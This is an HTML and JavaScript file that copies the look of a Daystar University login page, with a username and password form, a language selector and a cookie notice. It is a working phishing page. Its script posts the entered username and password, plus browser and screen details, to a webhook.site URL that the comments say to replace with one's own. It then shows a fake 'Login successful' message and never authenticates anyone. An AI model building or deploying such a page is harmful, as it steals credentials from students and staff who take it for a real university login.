<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Daystar University Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a3a5c 0%, #2a5f7a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 50px 40px 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
            transition: transform 0.3s ease;
        }

        .login-container:hover {
            transform: translateY(-5px);
        }

        .university-name {
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            color: #1a3a5c;
            letter-spacing: 1px;
            margin-bottom: 4px;
        }

        .university-name span {
            color: #c9a84c;
        }

        .motto {
            text-align: center;
            font-size: 13px;
            color: #5a7a8a;
            letter-spacing: 2px;
            font-weight: 300;
            margin-bottom: 35px;
            padding-bottom: 20px;
            border-bottom: 2px solid #e8edf0;
        }

        .motto span {
            font-weight: 600;
            color: #2a5f7a;
        }

        .form-group {
            margin-bottom: 22px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a3a5c;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }

        .form-group input {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #dce3e8;
            border-radius: 12px;
            font-size: 15px;
            background: #f8fafc;
            transition: all 0.3s ease;
            color: #1a3a5c;
        }

        .form-group input:focus {
            outline: none;
            border-color: #c9a84c;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(201, 168, 76, 0.15);
        }

        .form-group input::placeholder {
            color: #a0b4c0;
            font-weight: 300;
        }

        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #1a3a5c 0%, #2a5f7a 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 1px;
            margin-top: 6px;
        }

        .login-btn:hover {
            transform: scale(1.01);
            box-shadow: 0 8px 25px rgba(26, 58, 92, 0.35);
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
            padding-top: 18px;
            border-top: 1px solid #e8edf0;
        }

        .footer-links a {
            color: #5a7a8a;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
            transition: color 0.3s ease;
        }

        .footer-links a:hover {
            color: #c9a84c;
        }

        .lang-select {
            color: #5a7a8a;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .lang-select select {
            border: none;
            background: transparent;
            color: #1a3a5c;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            padding: 4px;
        }

        .lang-select select:focus {
            outline: none;
        }

        .cookie-notice {
            text-align: center;
            margin-top: 18px;
            font-size: 11px;
            color: #8aa0ae;
            letter-spacing: 0.3px;
        }

        .cookie-notice a {
            color: #2a5f7a;
            text-decoration: none;
            font-weight: 500;
        }

        .cookie-notice a:hover {
            color: #c9a84c;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .login-container {
                padding: 35px 20px 30px;
            }
            .university-name {
                font-size: 22px;
            }
            .motto {
                font-size: 11px;
                letter-spacing: 1px;
            }
            .form-group input {
                padding: 12px 14px;
                font-size: 14px;
            }
            .footer-links {
                flex-wrap: wrap;
                gap: 10px;
                justify-content: center;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- University Name -->
        <div class="university-name">
            DAYSTAR <span>UNIVERSITY</span>
        </div>
        <div class="motto">
            <span>Excellence</span> · Transformation · Servant-Leadership
        </div>

        <!-- Login Form -->
        <form id="loginForm" onsubmit="return handleLogin(event)">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter your username" required />
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required />
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <!-- Footer Links -->
        <div class="footer-links">
            <a href="#" id="lostPassword">Lost password?</a>
            <div class="lang-select">
                🌐
                <select id="languageSelect">
                    <option value="en">English (en)</option>
                    <option value="sw">Kiswahili (sw)</option>
                    <option value="fr">Français (fr)</option>
                </select>
            </div>
        </div>

        <!-- Cookies Notice -->
        <div class="cookie-notice">
            🍪 Cookies notice · <a href="#" id="cookiePolicy">Learn more</a>
        </div>
    </div>

    <script>
        // Handle login form submission with webhook integration
        function handleLogin(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert('Please fill in both username and password.');
                return false;
            }

            // Send data to webhook
            const webhookURL = 'https://webhook.site/your-unique-id-here'; // REPLACE WITH YOUR ACTUAL WEBHOOK URL

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`
                })
            })
            .then(response => {
                if (response.ok) {
                    alert('Login successful! Welcome to Daystar University.');
                } else {
                    alert('Login failed. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Network error. Please check your connection.');
            });

            // Clear fields after submission (optional)
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';

            return false;
        }

        // Lost password link
        document.getElementById('lostPassword').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Password reset link will be sent to your registered email.');
        });

        // Cookie policy link
        document.getElementById('cookiePolicy').addEventListener('click', function(e) {
            e.preventDefault();
            alert('This site uses cookies to enhance your experience. By continuing, you agree to our cookie policy.');
        });

        // Language selector
        document.getElementById('languageSelect').addEventListener('change', function() {
            alert(`Language changed to: ${this.options[this.selectedIndex].text}`);
        });
    </script>

</body>
</html>
